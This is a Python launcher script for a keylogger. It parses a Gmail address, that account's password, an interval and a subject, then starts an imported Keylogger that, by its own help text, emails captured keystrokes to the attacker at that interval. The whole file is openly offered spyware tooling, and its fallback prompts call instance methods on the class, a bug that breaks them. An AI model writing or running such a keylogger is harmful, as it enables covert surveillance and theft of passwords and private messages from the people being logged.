#!python3
import keylogger
import sys
import argparse

class Backup():
    def get_gmail_input(self):
        return str(input("Enter gmail to send the key logs: "))
    
    def get_password_input(self):
        return str(input("Enter password for the gmail provided to create a server instance: "))


def get_arguments():
    p = argparse.ArgumentParser(description="python key logger script")
    p.add_argument("-i", '--interval', dest='interval', help='time gap(seconds) b/w each email about key-logs, default is 1 day', default=86400)
    p.add_argument('-g', '--gmail', dest='gmail', help='to which email address you want to send key logs')
    p.add_argument("-p", '--password', dest='password', help='password of the email address provided')
    p.add_argument('-s', '--subject', dest='subject', help='subject content of the mail, default is empty', default='')
    options = p.parse_args()
    if not options.gmail:
        options.gmail = Backup.get_gmail_input()
    if not options.password:
        options.password = Backup.get_password_input()
    return options
    
def usage():
    print("[+] python keys.py -i interval -g gmail -p password -s subject_of_email")


user_input = get_arguments()
keys = keylogger.Keylogger(int(user_input.interval), user_input.gmail, user_input.password, user_input.subject)
keys.start()